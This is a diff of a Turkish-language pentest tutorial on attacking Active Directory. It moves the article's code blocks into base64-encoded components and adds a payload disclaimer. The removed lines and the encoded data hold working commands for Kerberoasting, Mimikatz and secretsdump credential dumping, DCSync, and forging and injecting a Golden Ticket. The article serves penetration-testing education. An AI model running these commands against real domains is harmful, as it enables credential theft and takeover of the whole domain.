@@ -5,6 +5,8 @@ description: "Kurumsal ağların omurgası olan Active Directory'ye yönelik Ker
 tags: ["Active Directory", "Pentest"]
 ---
 
+<PayloadDisclaimer />
+
 ## Neden Active Directory?
 
 Kurumsal ağların büyük çoğunluğu kimlik doğrulama ve yetkilendirme için Windows Active Directory kullanır. Bir domain kullanıcısı ele geçirildikten sonra AD zafiyetleri sömürülerek **Domain Admin** yetkisine ulaşmak mümkündür. Bu yüzden AD saldırıları her pentest metodolojisinin merkezindedir.
@@ -33,11 +35,7 @@ net group "Domain Admins" /domain
 net view /domain
 ```
 
-```bash
-# Linux'tan — impacket
-python3 GetADUsers.py -all DOMAIN/user:pass -dc-ip 10.10.10.1
-python3 GetUserSPNs.py DOMAIN/user:pass -dc-ip 10.10.10.1
-```
+<EncodedCodeBlock language="bash" data="IyBMaW51eCd0YW4g4oCUIGltcGFja2V0CnB5dGhvbjMgR2V0QURVc2Vycy5weSAtYWxsIERPTUFJTi91c2VyOnBhc3MgLWRjLWlwIDEwLjEwLjEwLjEKcHl0aG9uMyBHZXRVc2VyU1BOcy5weSBET01BSU4vdXNlcjpwYXNzIC1kYy1pcCAxMC4xMC4xMC4x" />
 
 ## BloodHound ile Yol Analizi
 
@@ -64,25 +62,13 @@ bloodhound &
 
 BloodHound'da işe yarar sorgular:
 
-```
-Shortest Paths to Domain Admins
-Find Principals with DCSync Rights
-Users with Most Local Admin Rights
-Kerberoastable Users
-```
+<EncodedCodeBlock language="text" data="U2hvcnRlc3QgUGF0aHMgdG8gRG9tYWluIEFkbWlucwpGaW5kIFByaW5jaXBhbHMgd2l0aCBEQ1N5bmMgUmlnaHRzClVzZXJzIHdpdGggTW9zdCBMb2NhbCBBZG1pbiBSaWdodHMKS2VyYmVyb2FzdGFibGUgVXNlcnM=" />
 
 ## Kerberoasting
 
 Service Principal Name (SPN) tanımlı hesaplar için Kerberos servis bileti talep edilir, bu bilet offline kırılabilir.
 
-```bash
-# impacket ile — ağdan direkt
-python3 GetUserSPNs.py DOMAIN/user:pass \
-  -dc-ip 10.10.10.1 -request -outputfile hashes.txt
-
-# Hedef Windows makineden — Rubeus
-.\Rubeus.exe kerberoast /outfile:hashes.txt
-```
+<EncodedCodeBlock language="bash" data="IyBpbXBhY2tldCBpbGUg4oCUIGHEn2RhbiBkaXJla3QKcHl0aG9uMyBHZXRVc2VyU1BOcy5weSBET01BSU4vdXNlcjpwYXNzIFwKICAtZGMtaXAgMTAuMTAuMTAuMSAtcmVxdWVzdCAtb3V0cHV0ZmlsZSBoYXNoZXMudHh0CgojIEhlZGVmIFdpbmRvd3MgbWFraW5lZGVuIOKAlCBSdWJldXMKLlxSdWJldXMuZXhlIGtlcmJlcm9hc3QgL291dGZpbGU6aGFzaGVzLnR4dA==" />
 
 Hash'i kır:
 
@@ -127,56 +113,19 @@ nxc smb 10.10.10.0/24 -u Administrator -H NTLM_HASH
 
 ## Credential Dumping
 
-```bash
-# Mimikatz — LSASS'tan hash dump (hedef Windows)
-mimikatz # privilege::debug
-mimikatz # sekurlsa::logonpasswords
-mimikatz # lsadump::sam
-
-# Secretsdump — uzaktan
-python3 secretsdump.py DOMAIN/user:pass@10.10.10.1
-python3 secretsdump.py -hashes :NTLM_HASH DOMAIN/user@10.10.10.1
-
-# NTDS.dit dump (DC'de)
-python3 secretsdump.py -ntds /path/ntds.dit -system /path/SYSTEM LOCAL
-```
+<EncodedCodeBlock language="bash" data="IyBNaW1pa2F0eiDigJQgTFNBU1MndGFuIGhhc2ggZHVtcCAoaGVkZWYgV2luZG93cykKbWltaWthdHogIyBwcml2aWxlZ2U6OmRlYnVnCm1pbWlrYXR6ICMgc2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRzCm1pbWlrYXR6ICMgbHNhZHVtcDo6c2FtCgojIFNlY3JldHNkdW1wIOKAlCB1emFrdGFuCnB5dGhvbjMgc2VjcmV0c2R1bXAucHkgRE9NQUlOL3VzZXI6cGFzc0AxMC4xMC4xMC4xCnB5dGhvbjMgc2VjcmV0c2R1bXAucHkgLWhhc2hlcyA6TlRMTV9IQVNIIERPTUFJTi91c2VyQDEwLjEwLjEwLjEKCiMgTlREUy5kaXQgZHVtcCAoREMnZGUpCnB5dGhvbjMgc2VjcmV0c2R1bXAucHkgLW50ZHMgL3BhdGgvbnRkcy5kaXQgLXN5c3RlbSAvcGF0aC9TWVNURU0gTE9DQUw=" />
 
 ## DCSync Saldırısı
 
 Domain Admin yetkisi varsa veya GetChangesAll hakkı varsa tüm domain hash'leri çekilebilir.
 
-```bash
-# Mimikatz
-mimikatz # lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator
-
-# impacket
-python3 secretsdump.py DOMAIN/user:pass@DC_IP -just-dc-user Administrator
-python3 secretsdump.py DOMAIN/user:pass@DC_IP -just-dc  # tüm hesaplar
-```
+<EncodedCodeBlock language="bash" data="IyBNaW1pa2F0egptaW1pa2F0eiAjIGxzYWR1bXA6OmRjc3luYyAvZG9tYWluOkRPTUFJTi5MT0NBTCAvdXNlcjpBZG1pbmlzdHJhdG9yCgojIGltcGFja2V0CnB5dGhvbjMgc2VjcmV0c2R1bXAucHkgRE9NQUlOL3VzZXI6cGFzc0BEQ19JUCAtanVzdC1kYy11c2VyIEFkbWluaXN0cmF0b3IKcHl0aG9uMyBzZWNyZXRzZHVtcC5weSBET01BSU4vdXNlcjpwYXNzQERDX0lQIC1qdXN0LWRjICAjIHTDvG0gaGVzYXBsYXI=" />
 
 ## Golden Ticket
 
 `krbtgt` hash'i ele geçirildikten sonra herhangi bir kullanıcı adına sahte Kerberos bileti üretilebilir.
 
-```bash
-# Mimikatz — krbtgt hash'i al
-mimikatz # lsadump::dcsync /user:krbtgt
-
-# Golden ticket oluştur
-mimikatz # kerberos::golden \
-  /user:Administrator \
-  /domain:DOMAIN.LOCAL \
-  /sid:S-1-5-21-XXXXX \
-  /krbtgt:KRBTGT_NTLM_HASH \
-  /ticket:golden.kirbi
-
-# Bileti yükle
-mimikatz # kerberos::ptt golden.kirbi
-
-# Doğrula
-klist
-dir \\DC01\C$
-```
+<EncodedCodeBlock language="bash" data="IyBNaW1pa2F0eiDigJQga3JidGd0IGhhc2gnaSBhbAptaW1pa2F0eiAjIGxzYWR1bXA6OmRjc3luYyAvdXNlcjprcmJ0Z3QKCiMgR29sZGVuIHRpY2tldCBvbHXFn3R1cgptaW1pa2F0eiAjIGtlcmJlcm9zOjpnb2xkZW4gXAogIC91c2VyOkFkbWluaXN0cmF0b3IgXAogIC9kb21haW46RE9NQUlOLkxPQ0FMIFwKICAvc2lkOlMtMS01LTIxLVhYWFhYIFwKICAva3JidGd0OktSQlRHVF9OVExNX0hBU0ggXAogIC90aWNrZXQ6Z29sZGVuLmtpcmJpCgojIEJpbGV0aSB5w7xrbGUKbWltaWthdHogIyBrZXJiZXJvczo6cHR0IGdvbGRlbi5raXJiaQoKIyBEb8SfcnVsYQprbGlzdApkaXIgXFxEQzAxXEMk" />
 
 ## Savunma Perspektifi
 
